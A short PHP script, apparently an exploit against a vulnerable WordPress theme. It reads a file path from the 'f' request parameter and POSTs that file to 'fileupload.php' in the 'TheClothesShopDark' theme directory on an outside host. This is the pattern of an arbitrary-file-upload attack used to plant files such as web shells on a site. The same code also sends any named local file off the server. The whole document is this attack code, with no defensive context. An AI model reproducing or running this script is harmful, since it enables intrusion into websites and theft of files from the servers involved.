<?php
	$ch = curl_init();
	$data = array('name' => 'Foo', 'file' => '@' . $_GET['f']);
	curl_setopt($ch, CURLOPT_URL, 'https://bramkaslp01/autos2day/wp-content/themes/TheClothesShopDark/lib/pages/fileupload.php');
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_exec($ch);
?>